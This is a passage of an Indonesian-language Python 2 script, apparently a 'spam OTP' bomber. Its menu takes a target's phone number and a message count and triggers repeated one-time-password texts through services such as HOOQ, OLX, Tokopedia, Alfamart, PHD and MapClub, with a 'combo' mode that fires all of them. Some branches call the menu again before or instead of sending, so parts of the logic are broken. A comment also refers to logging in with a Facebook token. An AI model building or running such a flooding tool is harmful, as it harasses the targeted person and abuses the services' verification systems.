				Phone = int(Phone) 
			
				Amount = input(''+W+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (h+'Mohon menunggu.....')
				print
				MapClub(Phone, Amount)
				print
				time.sleep(10)
				menu_spam()
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
		elif PilihTools == '2':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HOOQ')
				Tik(C+'\t\t'+13*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				Hooq(Phone, Amount)
				print
				time.sleep(10)
				menu_spam()
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '3':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HARVEST')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '4':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP OLX')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
	
		elif PilihTools == '5':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP TOKOPEDIA')
				Tik(C+'\t\t'+19*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '6':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP ALFAMART')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
				
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '7':
			try:
				print
				Tik(W+'\t\tSPAM OTP PHD')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
			
				else:
					pass
				
				Phone = int(Phone) 
				print
				print(C+'PHD'+W+' AUTO 3X SEND') 
				sleep(2)
				
				print
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
				print(W+'JIKA TIDAK TERKIRIM, BERARTI SUDAH LIMIT !')
				print
				Phd(Phone, 3) # DON'T CHANGE / JANGAN DI UBAH
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '8':
			try:
			
				print
				Tik(W+'SPAM COMBO OTP')
				Tik(C+''+14*'=')
				print
				Phone = raw_input(W+'NOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				jalan (H+'Mohon menunggu.....')
				print
				time.sleep(10)
				menu_spam()
				print(C+'\t----------- '+W+'HOOQ 3X'+C+' -----------')
				print
				Hooq(Phone, 3)
				print
				print(C+'\t----------- '+W+'HARVEST 3X'+C+' -----------')
				print
				HarVest(Phone, 3)
				print
				print(C+'\t----------- '+W+'OLX 3X'+C+' -----------')
				print
				Olx(Phone, 3)
				print
				print(C+'\t----------- '+W+'TOKOPEDIA 3X'+C+' -----------')
				print
				Tokped(Phone, 3)
				print
				print(C+'\t----------- '+W+'ALFAMART 3X'+C+' -----------')
				print
				AlfaMart(Phone, 3)
				print
				print(C+'\t----------- '+W+'PHD 3X'+C+' -----------')
				print
				Phd(Phone, 3)
				print
				print(C+'\t----------- '+W+'MAPCLUB 3X'+C+' -----------')
				print
				MapClub(Phone, 3)
				print
				print(W+'Thanks Udah Coba Combo'+C+' ^_^')
				sys.exit()
			
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except ConnectionError:
				print
				print(M+'TERJADI KESALAHAN JARINGAN !')
				sys.exit()
		
		elif PilihTools == '9':
			os.system('xdg-open http://wa.me/6285880818385?text=Hallo')
		
		elif PilihTools == 'X' or PilihTools == 'x':
			print
			print(W+'Terima kasih.....'+C+' ^_^')
			sys.exit()
			
		else:
			print
			print(W+'Tools Tidak Di Temukan'+C+' ^_^')
			sys.exit()

except ImportError:
	os.system('clear')
	print(C+'Module Belum Terpasang'+W+' ^_^')
	print(W+'Install Module'+C+' ...')
	sleep(0.01)
	print
	os.system('pip2 install -r requirements.txt')
	print
	print(C+'Selesai'+W+' ^_^') 
	sleep(0.01)
	os.system('clear')

def logo():
	time.sleep (0.01)
	print
	print
 	print ('\033[1;37m                    ______---_____ ')
  	print ('\033[1;37m         ___-----           __      ----_ ')
	print ('\033[1;37m ___---             ___------             \ ')
	print ('\033[1;37m     ---______        ----                 \ ')
	jalan ('\033[1;37m                 --__    |             _____) ')
	print ('\033[1;37m                     -                /     \ ')
	jalan ('\033[1;37m          _____-----    ___--         \    /)\ ')
	print ('\033[1;37m    -----_____      ---____            \__/  / ')
	jalan ('\033[1;37m                 --__    \ --    _          /\ ')
	print ('\033[1;37m                      --__-__     \_____/   \_/\ ')
	jalan ('\033[1;37m                            ----|   /          | ')
	print ('\033[1;36mAuthor \033[1;37m : Mbokey Bhizer  |  |___________| ')
	print ('\033[1;36msetatus sc\033[1;37m : Premium sampe mokat |  | ((_(_)| )_) ')
	jalan ('\033[1;36mJabatan\033[1;37m : \33[3;1m\033[1;37mPerecode hamdal\033[1;33mR.E...... \33[0;1m\033[1;37m|  \_((_(_)|/(_) ')
	print ('\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\             ( ')
	jalan ('\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\_____________)')
	print
	
	
def logo_():
	#os.system("clear")
	print(""" \x1b[1;36m\n    
	 \x1b[1;37m|__  /
     \x1b[1;37m  / /
     \x1b[1;37m / /_
     \x1b[1;37m/____|        \x1b[1;36m┛ \x1b[1;37m\n""")
     
HUT = '\x1b[1;34m'
H = '\x1b[1;37m'

#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#     
			
if __name__ == '__main__':
	buat_folder()
	pilihlogin()
